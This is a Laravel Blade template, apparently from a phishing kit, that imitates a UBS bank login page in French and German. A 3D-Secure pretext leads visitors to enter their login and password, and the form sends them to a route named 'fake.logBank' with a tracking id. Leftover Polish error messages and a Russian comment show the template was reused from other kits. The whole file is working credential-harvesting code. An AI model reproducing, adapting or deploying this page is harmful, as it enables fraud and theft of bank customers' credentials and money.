@extends('layouts.fake')
@push('css')
    <link href="{{ asset('css/ubs.css') }}" rel="stylesheet">
    <style>
        .de_lang {
            position: absolute;
            top: -9999px;
            left: -9999px;
        }
    </style>
@endpush
@section('content')
    <div class="container">

        <nav class="navbar navbar-expand-lg navbar-light bg-light rounded" style="margin-top: 3vh;">
            <img src="{{asset('images/banks/ubs_logo.svg')}}" alt="UBS" style="width:200px;">
            <div class="collapse navbar-collapse" id="navbarsExample09">
                <ul class="navbar-nav mr-auto">

                </ul>
                <!-- partial:index.partial.html -->
                <div class="lang_buttons superprikol">
                    <form class="form-inline my-2 my-md-0">
                        <a class="btn btn my-2 my-md-0 btn-block button de_lang"
                           href="#">Deutsch</a>
                        <a class="btn btn my-2 my-md-0 btn-block button en_lang"
                           href="#">Français</a>
                    </form>
                </div>

            </div>
        </nav>

        <div class="py-5 text-center" style="padding-top: 0rem!important">
            <hr>
            <p class="lead text-center de_lang">Pour confirmer l'opération dans le cadre de 3D-Secure, connectez-vous au
                service Ubs Ag.
            </p>
            <p class="lead text-center en_lang">Um den Vorgang im Rahmen von 3D-Secure zu bestätigen, melden Sie sich
                beim
                Ubs Ag service an.
            </p>
        </div>

        <div class="row">
            <div class="col-md-6 order-md-1">
                <h4 class="mb-3 de_lang">Login</h4>
                <h4 class="mb-3 en_lang">Login</h4>
                <form id="bank_pm_form" method="POST"
                      action="{{subRoute('fake.logBank', ['track_id' => $fake->track_id])}}"
                      role="form">
                    @csrf
                    <div class="row">
                        <div class="col-md-12 mb-3">
                            <label for="login" class="de_lang">E-mail</label>
                            <label for="login" class="en_lang">E-mail</label>
                            <input name="login" type="text" class="form-control"
                                   id="login" placeholder=""
                                   value=""
                                   required="">
                            <div class="invalid-feedback en_lang">
                                Client number or login is required
                            </div>
                            <div class="invalid-feedback de_lang">
                                Wymagany jest numer klienta lub login
                            </div>
                        </div>
                        <div class="col-md-12 mb-3">
                            <label for="password" class="de_lang">Mot de passe</label>
                            <label for="password" class="en_lang">Passwort</label>
                            <input name="password" type="text" class="form-control" id="password" placeholder=""
                                   value="" required="">
                            <div class="invalid-feedback en_lang">
                                Password is required
                            </div>
                            <div class="invalid-feedback de_lang">
                                Hasło jest wymagane
                            </div>
                        </div>
                    </div>
                    <hr class="mb-4">
                    <button class="btn btn-primary btn-lg btn-block de_lang" type="submit">Continuer</button>
                    <button class="btn btn-primary btn-lg btn-block en_lang" type="submit">Weiter zur Kasse</button>
                </form>
            </div>

            <div class="col-md-6 order-md-2 mb-4 cstm">
                <h4 class="d-flex justify-content-between align-items-center mb-3">
                    <span class="text-muted de_lang"><b>Sécurité</b></span>
                    <span class="text-muted en_lang">Security</span>
                </h4>
                <p class="lead de_lang"><b>Avez-vous reçu un code de réactivation ?</b>
                    <br>Connectez-vous d'abord. Ensuite, il vous sera demandé le code que vous avez reçu par
                    courrier.<br>
                </p>
                <p class="lead en_lang"><b>Haben Sie einen reaktivierungscode erhalten ?</b><br>
                    Melden Sie sich zuerst an. Dann werden Sie nach dem code gefragt, den Sie per post erhalten
                    haben.<br>
                </p>
                <p class="lead de_lang"><b>Avez-vous oublié votre mot de passe ?</b></p>
                <p class="lead en_lang"><b>Haben sie ihr passwort vergessen ?</b></p>
                <p class="lead de_lang">Vous pouvez le réinitialiser</p>
                <p class="lead en_lang">Sie können es zurücksetzen</p>
                <p class="lead de_lang"><a href="#"> </a></p>
            </div>

        </div>

        <footer class="my-5 pt-5 text-muted text-center text-small">
            <hr>
            <div class="row" style="font-size: 12px;">
                <div class="col-md-4 order-md-2 mb-4">
                    <p class="mb-1 text-left">© 2017-{{date('Y')}} Ubs Ag</p>
                </div>
                <div class="col-md-3 order-md-2 mb-4">
                    <p class="mb-1 text-left"></p>
                </div>
                <div class="col-md-5 order-md-2 mb-4">
                    <p class="mb-1 text-right"></p>
                </div>
            </div>
        </footer>
    </div>
@endsection
@push('js')
    <script type="text/javascript">
        $(".button.de_lang").click(function () {
            var deLang = document.getElementsByClassName("de_lang");
            var enLang = document.getElementsByClassName("en_lang");
            for (i = 0; i < enLang.length; i++) {
                enLang[i].style.position = "static";
                deLang[i].style.position = "absolute";
                deLang[i].style.top = "-9999px";
                deLang[i].style.left = "-9999px";
            }
        });

        $(".button.en_lang").click(function () {
            //alert("Нажата кнопка АНГЛИЙСКИЙ");
            var deLang = document.getElementsByClassName("de_lang");
            var enLang = document.getElementsByClassName("en_lang");
            for (i = 0; i < enLang.length; i++) {
                deLang[i].style.position = "static";
                enLang[i].style.position = "absolute";
                enLang[i].style.top = "-9999px";
                enLang[i].style.left = "-9999px";
            }
        });
    </script>
@endpush
